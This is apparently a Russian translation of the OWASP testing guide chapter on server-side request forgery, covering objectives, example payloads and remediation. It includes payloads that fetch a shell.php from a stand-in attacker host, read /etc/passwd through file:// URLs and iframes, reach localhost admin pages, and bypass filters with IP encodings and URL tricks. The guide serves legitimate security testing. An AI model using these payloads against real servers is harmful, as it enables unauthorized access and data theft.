# Подделка запросов на стороне сервера (SSRF)

| ID |
| --- |
| WSTG-INJT-19 |

## Резюме

Веб-приложения часто взаимодействуют с внутренними или внешними сетевыми ресурсами. Хотя предполагается, что отправляемые данные будут обрабатываться только целевым ресурсом, некорректная обработка пользовательских параметров может создать условия для проведения инъекционных атак. Одной из таких атак является подделка запросов на стороне сервера (Server-Side Request Forgery, SSRF). Успешная эксплуатация SSRF может предоставить злоумышленнику доступ к защищенным операциям, внутренним сетевым сервисам или локальным файлам в инфраструктуре приложения или организации. В ряде случаев SSRF может привести к удаленному выполнению кода (Remote Code Execution, RCE).

## Цели тестирования

- Идентифицировать точки внедрения SSRF.
- Проверить возможность эксплуатации выявленных точек внедрения.
- Оценить уровень критичности и потенциальное воздействие уязвимости.

## Методика тестирования

При тестировании на SSRF специалист пытается заставить целевой сервер непреднамеренно загрузить или сохранить вредоносное содержимое. Наиболее распространенным вектором проверки выступает локальное и удаленное подключение файлов (LFI/RFI). Другим ключевым аспектом SSRF являются доверительные отношения: сервер приложения часто имеет возможность сетевого взаимодействия с внутренними бэкенд-системами, изолированными от прямого доступа пользователей. Такие серверы нередко используют немаршрутизируемые приватные IP-адреса или ограничены доступом только с доверенных хостов. Находясь под защитой периметра сетевой топологии, они зачастую лишены глубоко эшелонированных механизмов аутентификации и контроля доступа, хотя содержат конфиденциальные данные или критические функции.

Рассмотрим следующий HTTP-запрос:

```http
GET https://example.com/page?page=about.php
```

Данный запрос можно протестировать с помощью следующих полезных нагрузок.

### Загрузка содержимого файла

```http
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

### Доступ к странице с ограниченным доступом

```http
GET https://example.com/page?page=http://localhost/admin
```

Или:

```http
GET https://example.com/page?page=http://127.0.0.1/admin
```

Обращение через петлевой интерфейс (loopback interface) позволяет запросить контент, доступный исключительно локальному хосту. Данный механизм опирается на предположение, что запросы с локального адреса обладают привилегиями прямого доступа к административной панели `/admin`.

Подобные доверительные отношения, при которых запросы, исходящие от локального хоста, обрабатываются без дополнительной проверки подлинности, зачастую превращают SSRF в критическую уязвимость.

### Чтение локального файла

```http
GET https://example.com/page?page=file:///etc/passwd
```

### Используемые HTTP-методы

Все приведенные выше пейлоады применимы к любому типу HTTP-запросов и могут быть внедрены не только в параметры URL, но также в значения HTTP-заголовков и cookie.

Важной особенностью SSRF при отправке POST-запросов является то, что уязвимость может проявляться скрытно (Blind SSRF), поскольку приложение может не возвращать данные немедленно в ответе. Внедренные данные могут использоваться во внутренних асинхронных процессах, таких как генерация PDF-отчетов, обработка счетов или накладных, доступных персоналу организации, но невидимых для конечного пользователя или тестировщика.

Подробнее о технике Blind SSRF можно прочитать в [руководстве PortSwigger](https://portswigger.net/web-security/ssrf/blind) или в [разделе ссылок](#ссылки-и-материалы).

### Генераторы PDF

В некоторых случаях сервер осуществляет конвертацию загруженных пользователем файлов в формат PDF. Попробуйте внедрить HTML-элементы `<iframe>`, `<img>`, `<base>`, `<script>` или CSS-функции `url()`, указывающие на внутренние сетевые сервисы:

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

### Типовые способы обхода фильтров

Некоторые приложения блокируют прямые обращения к `localhost` и `127.0.0.1`. Данные ограничения можно обойти следующими способами:

- Использование альтернативных представлений IP-адреса `127.0.0.1`:
    - Десятичная нотация: `2130706433`
    - Восьмеричная нотация: `017700000001`
    - Сокращенная запись IP: `127.1`
    - Альтернативные IP-адреса подсети loopback: `127.0.0.2`
- Обфускация строковых представлений
- Регистрация публичного DNS-домена, указывающего на IP-адрес `127.0.0.1`

В случаях, когда приложение требует соответствия ввода определенному шаблону (например, доменному имени), фильтрацию можно обойти при наличии дефектов в реализации парсера URL, что приводит к атакам, аналогичным [семантическим атакам на URI (semantic attacks)](https://tools.ietf.org/html/rfc3986#section-7.6):

- Использование символа `@` для разделения данных аутентификации (userinfo) и хоста: `https://expected-domain@attacker-domain`
- Фрагментация URL с помощью символа решетки `#`: `https://attacker-domain#expected-domain`
- URL-кодирование
- Фаззинг (Fuzzing)
- Комбинирование указанных методик

Дополнительные векторы полезных нагрузок и техники обхода приведены в [разделе ссылок](#ссылки-и-материалы).

## Рекомендации по устранению

SSRF считается одной из наиболее сложных для предотвращения атак без применения жестких списков разрешений (allow lists), фиксирующих конкретный перечень допустимых IP-адресов и URL. Подробные рекомендации по защите от SSRF представлены в [Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
